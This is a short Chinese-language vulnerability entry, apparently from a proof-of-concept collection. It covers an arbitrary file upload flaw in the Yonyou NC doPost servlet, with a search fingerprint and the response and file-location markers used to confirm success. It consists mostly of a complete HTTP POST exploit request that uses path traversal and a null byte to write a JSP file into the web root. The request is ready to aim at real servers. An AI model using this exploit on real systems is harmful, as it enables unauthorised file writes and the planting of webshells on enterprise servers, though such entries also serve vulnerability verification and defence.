﻿# 用友NC doPost接口 任意文件上传漏洞

> 更新时间：2024-03-26

> 漏洞编号：

> 漏洞说明：用友NC Cloud大型企业数字化平台,深度应用新一代数字智能技术,完全基于云原生架构,打造开放、互联、融合、智能的一体化云平台,聚焦数智化管理、数智化经营、数智化商业等三大企业数智化转型战略方针。用友NC doPost接口存在任意文件上传漏洞。

> 漏洞特征：title="YONYOU NC"

> 验证脚本：HTTP

```
POST /portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename=..%5C..%5C..%5Cwebapps%5Cnc_web%5Cdudesite.jsp%00 HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Cookie: LA_K1=langid
serverEnable: localserver
Content-Type: application/octet-stream
Content-Encoding: UTF_8

dudesite
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：/dudesite.jsp

> 验证文件来源：用友NC doPost接口 任意文件上传漏洞.poc

